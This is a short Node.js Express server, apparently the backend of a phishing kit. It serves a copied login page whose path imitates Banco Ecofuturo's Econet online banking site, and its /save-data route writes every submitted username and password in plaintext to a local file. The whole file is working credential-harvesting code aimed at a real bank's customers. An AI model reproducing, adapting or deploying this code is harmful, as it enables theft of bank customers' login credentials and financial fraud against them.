const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const app = express();
const port = process.env.PORT || 8080;


app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "public")));

app.post("/save-data", (req, res) => {
  const usuario = req.body.usuario;
  const password = req.body.password;
  const dataToWrite = `Usuario: ${usuario}, Password: ${password}\n`;

  const filePath = path.join(__dirname, "data.txt");

  fs.appendFile(filePath, dataToWrite, (err) => {
    if (err) {
      console.error("Error al guardar los datos:", err);
      res.status(500).send("Ocurrió un error al guardar los datos.");
    } else {
      console.log("Datos guardados con éxito.");
      res.send(`Hola, ${usuario}. Tus datos han sido guardados.`);
    }
  });
});

// Inicia el servidor
app.listen(port, () => {
  console.log(
    `Servidor escuchando en http://localhost:${port}/ecofuturo/econet.bancoecofuturo.com.bo_447/EconetWeb/Usuario/Login.html`
  );
});

